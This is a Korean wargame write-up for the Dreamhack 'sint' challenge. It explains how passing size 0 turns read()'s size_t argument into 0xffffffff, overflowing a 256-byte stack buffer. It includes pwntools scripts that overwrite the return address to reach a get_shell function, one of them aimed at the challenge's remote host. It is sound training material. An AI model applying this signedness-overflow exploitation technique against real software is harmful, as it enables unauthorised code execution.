# Exploit Tech: Type Error

# 들어가며

## 서론

---

이번 강의에서는 sint 워게임을 통한 실습을 진행한다. read 함수에서의 인자 전달 과정에서 일어나는 자료형 혼용이 어떤 상황을 발생시키는지 학습한다.

# 분석 및 설계

## 분석

---

### 보호 기법

checksec을 사용하여 적용된 보호 기법을 살펴보자.

```c
[*]
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

실습환경에는 ASLR이 적용되어 있고, 바이너리에는 NX가 적용되어 있다. Canary와 PIE는 적용되지 않았다. 또한 Partial RELRO가 적용되어 있다.

Canary가 적용되지 않았기 때문에 버퍼 오버플로우를 일이킬 시, 카나리를 올바른 값으로 다시 덮어주지 않아도 프로세스의 흐름을 계속 이어나갈 수 있다.

### 코드 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```

signal(SIGSEGV, get_shell)가 지정되었기 때문에 SIGSEGV 에러, 즉 세그먼트 에러가 발생하게 되면 셸을 획득할 수 있다. 세그먼트 에러는 main 함수의 RET에 올바르지 않은 주소를 입력함으로서 일으킬 수 있다.

size 변수의 범위를 확인하면서 오버플로우를 일으켜보자.

# 익스플로잇

## 익스플로잇

---

size 변수의 자료형과, 가질 수 있는 범위를 먼저 확인해보자.

```c
int main()
{
    char buf[256];
    int size;

    initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```

size 변수를 사용자로부터 입력받은 후, size > 256 || size < 0 이라면 프로세스를 종료한다. 따라서 size의 범위는 0~256이어야 한다.

올바른 사이즈가 설정되면 read(0, buf, size - 1)으로 buf에 문자열을 입력받는다. buf에는 256바이트가 할당되어 있으며, 버퍼 오버플로우가 일어나기 위해서는 257바이트 이상을 입력받아야 하나, read 함수가 읽을 바이트 수 인자는 size - 1로, -1~255의 값만이 가능하다.

이때 read 함수의 인자 자료형을 살펴보면

```c
ssize_t read(int fildes, void *buf, size_t nbyte)
```

읽어들일 바이트 수를 지정하는 nbyte 인자는 size_t 자료형인 것을 확인할 수 있다. size_t 자료형은 32비트 아키텍쳐에서 기본적으로 unsigned int와 동일한 연산을 진행한다. 따라서 nbyte의 인자로 -1이 들어간다면 자동으로 형변환되어 0xffffffff = 4294967295와 같은 의미를 가지게 된다. 따라서 size = 0으로 설정한 후, size - 1 = -1이 되게 하여 read(0, buf, 4294967295)와 같은 기능을 실행시키게 하여 버퍼 오버플로우를 일으킬 수 있다.

버퍼 오버플로우를 일이킨 후에는 RET에 올바르지 않은 주소가 들어가기만 하면 되기에, buf의 길이 이상의 적당히 긴 문자열을 전송하면 세그먼트 에러를 일으킬 수 있다. 혹은 PIE가 적용되지 않았기 때문에, get_shell의 주소를 RET에 삽입하는 방법으로 해결 또한 가능하다.

```c
from pwn import *

p = process("./sint")

p.sendline(b"0")
p.sendline(b"A" * (0x100 + 0x4 + 0x4))

p.interactive()
```

```c
from pwn import *

p = process("./sint")
e = ELF("./sint")
get_shell = e.symbols["get_shell"]

p.sendline(b"0")
p.sendline(b"A" * (0x100 + 0x4) + p32(get_shell))

p.interactive()
```

### 내 코드

```c
from pwn import *

p = remote("host3.dreamhack.games", 16604)
e = ELF("./sint")

binsh = e.symbols["get_shell"]

payload = b'A'*0x104 + b'B'*0x4 + p32(binsh)

p.sendlineafter(b"Size: ", b'0')
p.sendlineafter(b"Data: ", payload)

p.interactive()
```

buf의 주소가 rbp - 0x104인줄 알고 RET을 binsh로 덮어서 풀려 했는데, buf의 주소를 착각해서 오류로 셸을 얻는 코드가 됨.